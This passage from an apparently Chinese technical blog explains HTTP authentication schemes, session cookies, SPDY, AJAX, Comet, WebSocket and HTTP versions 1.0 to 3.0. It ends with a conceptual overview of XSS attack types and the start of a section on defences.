<p>&emsp;&emsp;BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，<strong>由于明文解码后就是用户 ID 和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程中，如果被人窃听，被盗的可能性极高。</strong></p>
</blockquote>
<blockquote>
<p>&emsp;&emsp;BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安全性等级，因此它并不常用。</p>
</blockquote>
<h3 id="DIGEST-认证"><a href="#DIGEST-认证" class="headerlink" title="DIGEST 认证"></a>DIGEST 认证</h3><p>&emsp;&emsp;为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证。<strong>DIGEST 认证同样使用质询/响应的方式，但不会像 BASIC 认证那样直接发送明文密码。</strong></p>
<blockquote>
<p>&emsp;&emsp;所谓质询响应方式是指，一开始客户端会先发送认证要求给服务端，服务端发送质询码给客户端，接着客户端使用接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。</p>
</blockquote>
<ul>
<li>步骤 1：请求需认证的资源时，服务器会随着状态码 401 Authorization Required，返回带<code>WWW-Authenticate</code>首部字段的响应。</li>
<li>步骤 2：接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段<code>Authorization</code>信息。</li>
<li>步骤 3：接收到包含首部字段<code>Authorization</code>请求的服务器，会确认认证信息的正确性。认证通过后则返回包含<code>Request-URI</code>资源的响应。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p>
</blockquote>
<h3 id="SSL-客户端认证"><a href="#SSL-客户端认证" class="headerlink" title="SSL 客户端认证"></a>SSL 客户端认证</h3><p>&emsp;&emsp;从使用用户 ID 和密码的认证方式方面来讲，只要二者的内容正确，即可认证是本人的行为。但如果<strong>用户 ID 和密码被盗</strong>，就很有可能被第三者冒充。利用 SSL 客户端认证则可以避免该情况的发生。  </p>
<p>&emsp;&emsp;SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否来自已登录的客户端。</p>
<ul>
<li>步骤 1：接收到需要认证资源的请求，服务器会发送<code>Certificate Request</code>报文，要求客户端提供客户端证书。</li>
<li>步骤 2：用户选择将发送的客户端证书后，客户端会把客户端证书信息以<code>Client Certificate</code>报文方式发送给服务器。</li>
<li>步骤 3：服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后<strong>开始 HTTPS 加密通信</strong>。</li>
</ul>
<blockquote>
<p>使用 SSL 客户端认证需要用到客户端证书。而客户端证书需要向认证机构购买。</p>
</blockquote>
<h3 id="表单认证"><a href="#表单认证" class="headerlink" title="表单认证"></a>表单认证</h3><p>&emsp;&emsp;基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。<br>&emsp;&emsp;多数情况下，输入已事先登录的用户 ID（通常是任意字符串或邮件地址）和密码等登录信息后，发送给 Web 应用程序，基于认证结果来决定认证是否成功。</p>
<h4 id="认证多半为表单认证"><a href="#认证多半为表单认证" class="headerlink" title="认证多半为表单认证"></a>认证多半为表单认证</h4><p>&emsp;&emsp;由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC 认证和 DIGEST 认证几乎不怎么使用。另外，SSL 客户端认证虽然具有高度的安全等级，但因为导入及维持费用等问题，还尚未普及。</p>
<h4 id="Session（会话）管理及-Cookie-应用"><a href="#Session（会话）管理及-Cookie-应用" class="headerlink" title="Session（会话）管理及 Cookie 应用"></a>Session（会话）管理及 Cookie 应用</h4><blockquote>
<p>&emsp;&emsp;基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。</p>
</blockquote>
<blockquote>
<p>&emsp;&emsp;但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。</p>
</blockquote>
<ul>
<li>步骤1：客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送。</li>
<li>步骤2：服务器会发放用以识别用户的 Session ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与 Session ID 绑定后记录在服务器端。</li>
<li>步骤3：客户端接收到从服务器端发来的 Session ID 后，会将其作为 Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送 Cookie，所以 SessionID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。</li>
</ul>
<h2 id="基于-HTTP-的功能追加协议"><a href="#基于-HTTP-的功能追加协议" class="headerlink" title="基于 HTTP 的功能追加协议"></a>基于 HTTP 的功能追加协议</h2><p>&emsp;&emsp;在建立 HTTP 标准规范时，制订者主要想把 HTTP 当作传输 HTML 文档的协议。随着时代的发展，Web 的用途更具多样性，比如演化成在线购物网站、SNS（SocialNetworking Service，社交网络服务）、企业或组织内部的各种管理工具，等等。<br>&emsp;&emsp;而这些网站所追求的功能可通过Web应用和脚本程序实现。即使这些功能已经满足需求，在性能上却未必最优，这是因为 HTTP 协议上的限制以及自身性能有限。<br>&emsp;&emsp;HTTP 功能上的不足可通过创建一套全新的协议来弥补。可是目前基于 HTTP 的 Web 浏览器的使用环境已遍布全球，因此无法完全抛弃 HTTP。有一些新协议的规则是基于 HTTP 的，并在此基础上添加了新的功能。</p>
<h3 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h3><p>&emsp;&emsp;Google 在 2010 年发布了 SPDY，其开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间（50%）。</p>
<h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p>&emsp;&emsp;在 Facebook 和 Twitter 等 SNS 网站上，短的时间内就会发生大量的内容更新。<br>&emsp;&emsp;为了尽可能实时地显示这些更新的内容，服务器上一有内容更新，就需要直接把那些内容反馈到客户端的界面上。虽然看起来挺简单的，但 HTTP 却无法妥善地处理好这项任务。<br>&emsp;&emsp;使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生徒劳的通信。</p>
<h4 id="HTTP-的瓶颈"><a href="#HTTP-的瓶颈" class="headerlink" title="HTTP 的瓶颈"></a>HTTP 的瓶颈</h4><ul>
<li>一条连接上只可发送一个请求。</li>
<li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li>
<li>请求/响应首部未经压缩就发送。首部信息越多延迟越大。</li>
<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li>
<li>可任意选择数据压缩格式。非强制压缩发送。</li>
</ul>
<h4 id="那么-SPDY-如何解决这些瓶颈呢？"><a href="#那么-SPDY-如何解决这些瓶颈呢？" class="headerlink" title="那么 SPDY 如何解决这些瓶颈呢？"></a>那么 SPDY 如何解决这些瓶颈呢？</h4><ul>
<li>AJAX</li>
<li>Comet</li>
</ul>
<figure class="image-box">
                <img src="16f3bd07648dd67f.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与传输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。<br>&emsp;&emsp;SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方法、Cookie 以及 HTTP 报文等。</p>
<h4 id="SPDY-的优点"><a href="#SPDY-的优点" class="headerlink" title="SPDY 的优点"></a>SPDY 的优点</h4><ul>
<li>多路复用流。<br>&emsp;&emsp;通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。<strong>所有请求的处理都在一条 TCP 连接上完成</strong>，因此 TCP 的处理效率得到提高。</li>
<li>请求优先级<br>&emsp;&emsp;SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响应变慢的问题。</li>
<li>压缩 HTTP 首部<br>&emsp;&emsp;这样一来，通信产生的数据包数量和发送的字节数就更少了。</li>
<li>推送功能<br>&emsp;&emsp;支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送数据，而不必等待客户端的请求。</li>
</ul>
<h3 id="AJAX-技术"><a href="#AJAX-技术" class="headerlink" title="AJAX 技术"></a>AJAX 技术</h3><p>&emsp;&emsp;AJAX 不是 JavaScript 的规范，它只是一个哥们“发明”的缩写：Asynchronous JavaScript and XML，意思就是<strong>用 JavaScript 执行异步网络请求</strong>。</p>
<blockquote>
<p>&emsp;&emsp;Ajax（Asynchronous JavaScript and XML，异步 JavaScript 与 XML 技术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文档对象模型）的操作，以达到局部 Web 页面替换加载的异步通信手段。和以前的同步通信相比，由于它只<strong>更新一部分页面，响应中传输的数据量会因此而减少</strong>，这一优点显而易见。</p>
</blockquote>
<p>&emsp;&emsp;Ajax 的<strong>核心技术是名为<code>XMLHttpRequest</code>的 API</strong>，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">引用廖雪峰老师的例子（利用 XMLHttpRequest 来做请求）</span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line">----</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="built_in">document</span>.getElementById(<span class="string">'test-response-text'</span>);</span><br><span class="line">    textarea.value = text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="built_in">document</span>.getElementById(<span class="string">'test-response-text'</span>);</span><br><span class="line">    textarea.value = <span class="string">'Error code: '</span> + code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// 新建 XMLHttpRequest 对象</span></span><br><span class="line"></span><br><span class="line">request.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// 状态发生变化时，函数被回调</span></span><br><span class="line">    <span class="keyword">if</span> (request.readyState === <span class="number">4</span>) &#123; <span class="comment">// 成功完成</span></span><br><span class="line">        <span class="comment">// 判断响应结果:</span></span><br><span class="line">        <span class="keyword">if</span> (request.status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 成功，通过 responseText 拿到响应的文本:</span></span><br><span class="line">            <span class="keyword">return</span> success(request.responseText);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 失败，根据响应码判断失败原因:</span></span><br><span class="line">            <span class="keyword">return</span> fail(request.status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// HTTP 请求还在继续...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送请求:</span></span><br><span class="line">request.open(<span class="string">'GET'</span>, <span class="string">'/api/categories'</span>);</span><br><span class="line">request.send();</span><br><span class="line"></span><br><span class="line">alert(<span class="string">'请求已发送，请等待响应...'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Comet"><a href="#Comet" class="headerlink" title="Comet"></a>Comet</h3><p>&emsp;&emsp;一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客户端返回响应。这是<strong>一种通过延迟应答，模拟实现服务器端向客户端推送（Server Push）的功能</strong>。<br>&emsp;&emsp;通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即反馈给客户端。<br>&emsp;&emsp;内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。</p>
<h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><h4 id="产生背景"><a href="#产生背景" class="headerlink" title="产生背景"></a>产生背景</h4><p>&emsp;&emsp;很多网站为了实现<strong>推送技术</strong>，所用的技术都是轮询。轮询是在<strong>特定的的时间间隔（如每 1 秒），由浏览器对服务器发出 HTTP 请求，然后由服务器返回最新的数据给客户端的浏览器</strong>。这种传统的模式带来很明显的缺点，即浏览器需要不断的向服务器发出请求，然而 HTTP 请求可能包含较长的头部，其中真正有效的数据可能只是很小的一部分，显然这样会浪费很多的带宽等资源。<br>&emsp;&emsp;而比较新的技术去做轮询的效果是 <strong>Comet</strong>。这种技术虽然可以双向通信，但依然需要反复发出请求。而且在 Comet 中，普遍采用的长链接，也会消耗服务器资源。</p>
<blockquote>
<p>&emsp;&emsp;Comet 本质上也是轮询，但是在没有消息的情况下，服务器先拖一段时间，等到有消息了再回复。这个机制暂时地解决了实时性问题，但是它带来了新的问题：以多线程模式运行的服务器会让大部分线程大部分时间都处于挂起状态，极大地浪费服务器资源。另外，一个 HTTP 连接在长时间没有数据传输的情况下，链路上的任何一个网关都可能关闭这个连接，而网关是我们不可控的，这就要求 Comet 连接必须定期发一些 ping 数据表示连接“正常工作”。</p>
</blockquote>
<p>&emsp;&emsp;在这种情况下，HTML5 定义了 WebSocket 协议，能更好的节省服务器资源和带宽，并且能够更实时地进行通讯。</p>
<h4 id="WebSocket-连接创建过程"><a href="#WebSocket-连接创建过程" class="headerlink" title="WebSocket 连接创建过程"></a>WebSocket 连接创建过程</h4><ul>
<li><p>WebSocket 连接必须由浏览器发起，因为请求协议是一个标准的 HTTP 请求，格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET ws://localhost:3000/ws/chat HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Origin: http://localhost:3000</span><br><span class="line">Sec-WebSocket-Key: client-random-string</span><br><span class="line">Sec-WebSocket-Version: 13</span><br></pre></td></tr></table></figure>
</li>
<li><p>该请求和普通的 HTTP 请求有几点不同:</p>
<ul>
<li>GET 请求的地址不是类似<code>/path/</code>，而是以<code>ws://</code>开头的地址</li>
<li>请求头<code>Upgrade: websocket</code>和<code>Connection: Upgrade</code>表示这个连接将要被转换为 WebSocket 连接；</li>
<li><code>Sec-WebSocket-Key</code>是用于标识这个连接，并非用于加密数据；</li>
<li><code>Sec-WebSocket-Version</code>指定了 WebSocket 的协议版本。</li>
</ul>
</li>
<li><p>随后，服务器如果接受该请求，就会返回如下响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: server-random-string</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;<strong>该响应代码 101 表示本次连接的 HTTP 协议即将被更改</strong>，更改后的协议就是<code>Upgrade: websocket</code>指定的 <strong>WebSocket 协议</strong>。  </p>
<p>&emsp;&emsp;版本号和子协议规定了双方能理解的数据格式，以及是否支持压缩等等。如果仅使用 WebSocket 的 API，就不需要关心这些。  </p>
<p>&emsp;&emsp;现在，一个 WebSocket 连接就建立成功，浏览器和服务器就可以随时主动发送消息给对方。消息有两种，一种是文本，一种是二进制数据。通常，我们可以发送 JSON 格式的文本，这样，在浏览器处理起来就十分容易。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>&emsp;&emsp;WebSocket 并不是全新的协议，而是利用了 HTTP 协议来建立连接。<br>&emsp;&emsp;WebSocket 使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在 WebSocket API 中，浏览器和服务器只需要完成<strong>一次握手</strong>，两者之间就直接可以创建<strong>持久性的连接</strong>，并进行双向数据传输。<br>&emsp;&emsp;在 WebSocket API 中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。<br>&emsp;&emsp;由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端，而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。<br>&emsp;&emsp;为什么 WebSocket 连接可以实现全双工通信而HTTP连接不行呢？实际上 HTTP 协议是建立在 TCP 协议之上的，TCP 协议本身就实现了全双工通信，但是 HTTP 协议的请求－应答机制限制了全双工通信。<strong>WebSocket 连接建立以后，其实只是简单规定了一下：接下来，咱们通信就不使用 HTTP 协议了，直接互相发数据吧。</strong><br>&emsp;&emsp;安全的 WebSocket 连接机制和 HTTPS 类似。首先，浏览器用<code>wss://xxx</code>创建 WebSocket 连接时，会先通过 HTTPS 创建安全的连接，然后，该 HTTPS 连接升级为 WebSocket 连接，底层通信走的仍然是安全的 SSL/TLS 协议。</p>
<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul>
<li>推送功能<br>&emsp;&emsp;支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。</li>
<li>减少通信量<br>&emsp;&emsp;只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。</li>
</ul>
<blockquote>
<p>&emsp;&emsp;成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。</p>
</blockquote>
<p>&emsp;&emsp;很显然，要支持 WebSocket 通信，浏览器得支持这个协议，这样才能发出<code>ws://xxx</code>的请求。目前，支持 WebSocket 的主流浏览器如下：</p>
<ul>
<li>Chrome</li>
<li>Firefox</li>
<li>IE &gt;= 10</li>
<li>Sarafi &gt;= 6</li>
<li>Android &gt;= 4.4</li>
<li>iOS &gt;= 8</li>
</ul>
<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>&emsp;&emsp;最早的 HTTP 只是使用在一些较为简单的网页上和网络请求上，所以比较简单，每次请求都打开一个新的TCP链接，收到响应之后立即断开连接。</p>
<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><ul>
<li>HTTP/1.1 引入了更多的缓存控制策略，如 Entity tag，If-Unmodified-Since, If-Match, If-None-Match 等。</li>
<li>HTTP/1.1 允许范围请求，即在请求头中加入<code>Range</code>头部。</li>
<li>HTTP/1.1 的请求消息和响应消息都必须包含<code>Host</code>头部，以区分同一个物理主机中的不同虚拟主机的域名。</li>
<li>HTTP/1.1 默认开启持久连接，在一个 TCP 连接上可以传送多个 HTTP 请求和响应，减少了建立和关闭连接的消耗和延迟。</li>
</ul>
<h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>&emsp;&emsp;在 HTTP/2 中，有两个非常重要的概念，分别是帧（frame）和流（stream），理解这两个概念是理解下面多路复用的前提。<br>&emsp;&emsp;帧代表数据传输的最小的单位，每个帧都有序列标识表明该帧属于哪个流，流也就是多个帧组成的数据流，每个流表示一个请求。这里有个 <a href="https://chrome.google.com/webstore/detail/http2-and-spdy-indicator/mpbpobfflnpcgagjijhmgnchggcjblin?hl=zh-CN" target="_blank" rel="noopener">Chrome 扩展程序</a>，可以方便的查看当前网站的 HTTP 请求版本（安装后在 Chrome 开发工具 - Network - 在 Name/Size/Time 表格头右键选择 Procotol，即可查看协议版本）。</p>
<ul>
<li><strong>新的二进制格式</strong>： HTTP/1.x 的解析是基于文本的。基于文本协议的解析存在天然缺陷，文本的表现形式有多样性，要做到全面性考虑的场景必然很多。二进制则不同，只识别 0 和 1 的组合。基于这种考虑 HTTP/2.0 的协议解析采用二进制格式，方便且强大。</li>
<li><strong>多路复用</strong>： HTTP/2.0 支持多路复用，这是 HTTP/1.1 持久连接的升级版。多路复用，就是在一个 TCP 连接中可以存在多条流，也就是可以发送多个请求，服务端则可以通过帧中的标识知道该帧属于哪个流（即请求），通过重新排序还原请求。多路复用允许并发的发起多个请求，每个请求及该请求的响应不需要等待其他的请求或响应，避免了线头阻塞问题。这样某个请求任务耗时严重，不会影响到其它连接的正常执行，极大的提高传输性能。</li>
<li><strong>头部压缩</strong>： HTTP/1.x 的请求和响应头部带有大量信息，而且每次请求都要重复发送，HTTP/2.0 使用 encoder 来减少需要传输的头部大小，通讯双方各自 cache 一份头部 fields 表，既避免了重复头部的传输，又减小了需要传输的大小。</li>
<li><strong>服务端推送</strong>： 这里的服务端推送指把客户端所需要的 css/js/img 资源伴随着 index.html 一起发送到客户端，省去了客户端重复请求的步骤（从缓存中取）。</li>
</ul>
<h3 id="HTTP-3-0"><a href="#HTTP-3-0" class="headerlink" title="HTTP/3.0"></a>HTTP/3.0</h3><p>&emsp;&emsp;HTTP/2.0 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接。但当这个连接中出现了丢包的情况，那就会导致整个 TCP 都要开始等待重传，也就导致了后面的所有数据都被阻塞了。反而对于 HTTP/1.0 来说，可以开启多个 TCP 连接，出现丢包反倒只会影响其中一个连接，剩余的 TCP 连接还可以正常传输数据。<br>&emsp;&emsp;出现包阻塞的原因是因为底层 TCP 协议导致的问题，但是修改 TCP 协议是不现实的问题，就像<code>typeof null === &#39;object&#39;</code>一样，修改这个问题会导致出现更多的问题。既然不能修改你，那就另起一个协议取代你。Google 基于 UDP 协议推出了一个的 QUIC 协议，并且使用在了 HTTP/3 上。  </p>
<p>&emsp;&emsp;QUIC 基于 UDP，但是 UDP 本身存在不稳定性等诸多问题，所以 QUIC 在 UDP 的基础上新增了很多功能，比如多路复用、0-RTT、使用 TLS1.3 加密、流量控制、有序交付、重传等等功能。优点诸多，参考<a href="https://www.jianshu.com/p/bb3eeb36b479" target="_blank" rel="noopener">这里</a>：</p>
<ul>
<li><strong>避免包阻塞</strong>： 多个流的数据包在 TCP 连接上传输时，若一个流中的数据包传输出现问题，TCP 需要等待该包重传后，才能继续传输其它流的数据包。但在基于 UDP 的 QUIC 协议中，不同的流之间的数据传输真正实现了相互独立互不干扰，某个流的数据包在出问题需要重传时，并不会对其他流的数据包传输产生影响。</li>
<li><strong>快速重启会话</strong>： 普通基于 TCP 的连接，是基于两端的 ip 和端口和协议来建立的。在网络切换场景，例如手机端切换了无线网，使用 4G 网络，会改变本身的 ip，这就导致 tcp 连接必须重新创建。而 QUIC 协议使用特有的 UUID 来标记每一次连接，在网络环境发生变化的时候，只要 UUID 不变，就能不需要握手，继续传输数据。</li>
</ul>
<hr>
<h1 id="Web-攻击与防御"><a href="#Web-攻击与防御" class="headerlink" title="Web 攻击与防御"></a>Web 攻击与防御</h1><h2 id="Web-攻击分类"><a href="#Web-攻击分类" class="headerlink" title="Web 攻击分类"></a>Web 攻击分类</h2><p>&emsp;&emsp;简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的<strong>服务器和客户端</strong>，以及运行在服务器上的 <strong>Web 应用</strong>等资源才是攻击目标。</p>
<p>Web 应用的攻击模式有以下两种：</p>
<ul>
<li>主动攻击（主要攻击服务器上的资源）<ul>
<li>SQL 注入攻击</li>
<li>OS 命令注入攻击</li>
<li>其他</li>
</ul>
</li>
<li>被动攻击（主要攻击用户的资源和权限）<ul>
<li>跨站脚本攻击</li>
<li>跨站点请求伪造</li>
<li>点击劫持（与跨站请求伪造手法相似）</li>
<li>HTTP 首部注入攻击</li>
<li>其他</li>
</ul>
</li>
</ul>
<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>&emsp;&emsp;跨站脚本攻击（XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内<strong>运行非法的 HTML 标签或 JavaScript</strong> 进行的一种攻击。动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。<strong>目的：利用网站漏洞从用户那里恶意盗取信息。</strong><br>&emsp;&emsp;XSS 攻击，通常指黑客通过 “HTML 注入” 篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于 JavaScript 的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，XSS 这个名字却一直保留下来。</p>
<h3 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h3><ul>
<li>反射型 XSS（非持久型 XSS）</li>
<li>DOM 型 XSS（非持久性 XSS）</li>
<li>存储型 XSS（持久性 XSS 攻击）</li>
</ul>
<h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><ul>
<li>攻击构造出特殊的 URL ，其中包含恶意代码。（这个恶意代码诸如第三方的 JS 或<code>document.cookie</code>等）</li>
<li>用户被诱导打开带有恶意代码的 URL，服务器端将恶意代码从 URL 中取出当做参数处理，然后返回给用户带有恶意代码的数据。</li>
<li>用户浏览器接收到响应解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户敏感数据发送给攻击者，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<h3 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h3><blockquote>
<p>&emsp;&emsp;从效果上来说也是反射型 XSS，单独划分出来，是因为 DOM Based XSS 的形成原因比较特别，发现它的安全专家专门提出了这种类型的 XSS。出于历史原因，也就把它单独作为一个分类了。</p>
</blockquote>
<ul>
<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
<li>用户被诱导打开带有恶意代码的 URL。</li>
<li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>&emsp;&emsp;存储型 XSS 跟 反射型 XSS 的区别是：存储型 XSS 的恶意代码存在服务器上，反射型 XSS 的恶意代码存在 URL 里。<strong>它是最危险的一种跨站脚本。</strong>比反射性 XSS 和 DOM 型 XSS 都更有隐蔽性，因为它不需要用户手动触发。<strong>任何允许用户存储数据的 Web 程序都可能存在存储型 XSS 漏洞。</strong>若某个页面遭受存储型 XSS 攻击，所有访问该页面的用户都会被 XSS 攻击。</p>
<ul>
<li>攻击者把恶意代码提交到目标网站的服务器中。</li>
<li>用户打开目标网站，网站服务器端把带有恶意代码的数据取出，当做正常数据返回给用户。</li>
<li>用户浏览器接收到响应解析执行，混在其中的恶意代码也被执行。</li>
<li>恶意代码窃取用户敏感数据发送给攻击者，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
<li><p>浏览器自带防御（X-XSS-Protection）<br>&emsp;&emsp;HTTP X-XSS-Protection 响应头是 Internet Explorer，Chrome 和 Safari 的一个功能，当检测到跨站脚本攻击（XSS）时，浏览器将停止加载页面。<strong>其原理是检查 URL 和 DOM 中元素的相关性，但这并不能完全防止反射型 XSS，而且也并不是所有浏览器都支持 X-XSS-Protection。</strong></p>
